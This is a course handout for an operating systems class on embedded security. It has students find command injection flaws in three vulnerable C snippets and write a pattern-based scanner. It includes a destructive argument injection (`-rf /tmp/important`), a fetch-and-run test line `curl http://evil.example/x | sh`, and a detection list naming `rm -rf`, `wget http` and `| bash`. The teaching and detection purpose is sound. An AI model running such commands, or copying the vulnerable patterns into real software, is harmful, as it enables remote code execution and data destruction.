# Topic 7 — In-Class Activities

**Course:** CST-315 Operating Systems Lecture & Lab
**Topic:** Embedded Systems and Security
**Reading:** Stallings, Chapter 13
**Companion lesson:** [Topic_7_Embedded_Security.html](../lessons/Topic_7_Embedded_Security.html)
**Master visualization:** [Factory_OS_Master.html](../Factory_OS_Master.html)

Activity 1 reads a vulnerable C snippet aloud and finds the injection vector. Activity 2 writes the detector scanner that Assignment 4 requires.

---

## Activity 1 — Find the injection vector

**Duration:** ~20 minutes (5 min framing · 10 min work · 5 min debrief)
**Format:** Pairs, on paper
**Aligned objectives:** 1, 3, 4

### Bridge to assignment
Assignment 4 asks students to design a command injection virus. They cannot design what they cannot recognize. This activity exercises recognition on three small examples.

### Setup
- Print or display three short C snippets (below).
- No laptops needed; pen and paper only.

### Steps
1. **Frame (5 min).** Define: a command injection vulnerability is anywhere user-controlled data flows into a shell command without sanitization. Examples of "shell command": `system()`, `popen()`, `execvp("/bin/sh", ...)`, or any `execvp("...", argv)` where `argv` was assembled from user input.

2. **Identify (10 min).** For each snippet:
   - Mark the trust boundary (where data crosses from untrusted to executed).
   - Write a one-line malicious input that exploits it.
   - Propose a fix in two sentences.

**Snippet A:**
```c
char cmd[256];
snprintf(cmd, sizeof(cmd), "grep %s /etc/services", user_input);
system(cmd);
```

**Snippet B:**
```c
char *argv[3];
argv[0] = "/bin/sh";
argv[1] = "-c";
argv[2] = user_query;     /* user_query came from a TCP socket */
execv("/bin/sh", argv);
```

**Snippet C:**
```c
char *argv[3];
argv[0] = "/bin/rm";
argv[1] = filename;       /* filename = user_input */
argv[2] = NULL;
execvp(argv[0], argv);
```

3. **Debrief (5 min).** Two pairs walk one snippet each. Confirm: snippet C, despite using `execvp` directly, is still exploitable if `filename` is `-rf /tmp/important`. The lesson: argv values are also attack surface.

### Discussion prompts
- Snippet C looks safer than A and B. Is it? What is the residual risk?
- For each snippet, what defensive change would have closed the vulnerability without breaking the legitimate use case?
- Assignment 4 forbids the use of `system()`. Why does the spec specifically rule out the easy path?

### Instructor notes
- Common pitfall: students think `execvp` is automatically safe. It is not — it just avoids shell interpretation. Argument values still control behavior.
- Expected outcomes: by the debrief, every pair has identified all three vulnerabilities. The C snippet is the trickiest; the right answer is "validate filename against an allow-list of safe characters."
- Time checkpoint: by minute 12 every pair should be on snippet C.

### Stretch goal
Snippet B uses `execv` with `/bin/sh -c`. Suppose you replace it with `system(user_query)`. Is the behavior identical? (Almost — the difference is the exit status conventions and the parent's signal handling. Both are still vulnerable in the same way.)

---

## Activity 2 — Write a pattern-based scanner

**Duration:** ~40 minutes (5 min frame · 30 min code · 5 min discuss)
**Format:** Individual at laptop; pairs allowed for debugging
**Aligned objectives:** 2, 3

### Bridge to assignment
This activity produces the detection program required by Assignment 4: scan every file in a directory and warn on suspicious patterns. Students leave class with a working scanner that flags real signals (not just text matching).

### Setup
- Working Linux/UNIX environment.
- A new directory: `~/CST-315/Topic7`.
- A test corpus: 4–5 small C files, some safe and some with the patterns to flag.

### Steps

#### Part A — Define the signals (5 min)
On the board:
- Signal 1: contains the literal `system(` followed by a non-string-literal argument (concatenation).
- Signal 2: contains `execve`, `execvp`, or `execv` where the program path or argv comes from a variable assigned from input.
- Signal 3: contains literal substrings `rm -rf`, `chmod 777`, `curl http`, or `wget http` followed by `| sh` or `| bash`.

A pattern-matching scanner can catch signal 3 cheaply, signal 1 with regex, and signal 2 only with crude heuristics. We'll do signal 1 + signal 3.

#### Part B — Implement (30 min)

Create `~/CST-315/Topic7/scan.c`:

```c
/* scan.c — flag files containing suspicious injection patterns */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>

const char *patterns[] = {
    "system(",
    "rm -rf",
    "chmod 777",
    "curl http", "wget http",
    "| sh", "| bash",
    NULL
};

int file_has_pattern(const char *path, const char **found) {
    FILE *f = fopen(path, "r");
    if (!f) return 0;
    char line[1024];
    while (fgets(line, sizeof(line), f)) {
        for (int i = 0; patterns[i]; i++) {
            if (strstr(line, patterns[i])) {
                *found = patterns[i];
                fclose(f);
                return 1;
            }
        }
    }
    fclose(f);
    return 0;
}

void scan_dir(const char *path) {
    DIR *d = opendir(path);
    if (!d) { perror(path); return; }
    struct dirent *ent;
    while ((ent = readdir(d)) != NULL) {
        if (ent->d_name[0] == '.') continue;
        char full[1024];
        snprintf(full, sizeof(full), "%s/%s", path, ent->d_name);
        struct stat st;
        if (stat(full, &st) != 0) continue;
        if (S_ISDIR(st.st_mode)) { scan_dir(full); continue; }
        const char *found = NULL;
        if (file_has_pattern(full, &found))
            printf("WARNING: %s contains suspicious pattern \"%s\"\n", full, found);
    }
    closedir(d);
}

int main(int argc, char **argv) {
    const char *target = (argc > 1) ? argv[1] : ".";
    scan_dir(target);
    return 0;
}
```

Compile:
```bash
gcc scan.c -o scan
```

Build the test corpus in `~/CST-315/Topic7/test/`:
- `clean1.c` — a HelloWorld that does nothing suspicious.
- `clean2.c` — comments that *describe* what `rm -rf` does, no actual call. This is a false positive trap.
- `bad1.c` — uses `system(cmd)` with a concatenated cmd.
- `bad2.sh` — `curl http://evil.example/x | sh`.

Run:
```bash
./scan test/
```

Verify all four files are reported as you expect — note that `clean2.c` falsely flags. Screenshot.

#### Part C — Discuss (5 min)
Commit and push. Reflect: how would you reduce false positives while still catching real injections?

### Discussion prompts
- The scanner walks the directory tree recursively. Where would it loop forever, and how do you prevent that? (Hint: symbolic links.)
- A real attacker obfuscates: `s='rm'; s2='-rf'; system(concat(s, s2))`. Does your scanner catch this? (No — that's why pure pattern matching is the weakest detection layer.)
- For Assignment 4 you must also build the virus itself (separately). The scanner here scans for it. Why is the asymmetry important?

### Instructor notes
- Common pitfalls: scanning binary files and producing garbled output; not handling symlink loops; flagging the scanner's own source code (which contains the patterns as string literals). Add an extension filter (`.c`, `.sh`) if time permits.
- Expected outcomes: every student leaves with a working scanner. The false positive on `clean2.c` is the teaching moment — pattern matching is necessary but not sufficient.
- Time checkpoint: by minute 30 every student should have the scanner reporting matches.

### Stretch goal
Add a `-q` (quiet) mode that prints only the number of flagged files, and a `-v` mode that prints the full matching line. Both are easy additions and are useful for Assignment 4's evaluation table.

---

## Closeout (last 2 minutes of class)

Direct students to:
- Begin Assignment 4's virus design tonight. The virus must use `exec*()`, not `system()`, per spec.
- Read Stallings Ch. 14 on virtualization before next class. Topic 8 is the final content topic.
- Plan time for the Topics 7–8 quiz — it covers Ch. 13–14 together.
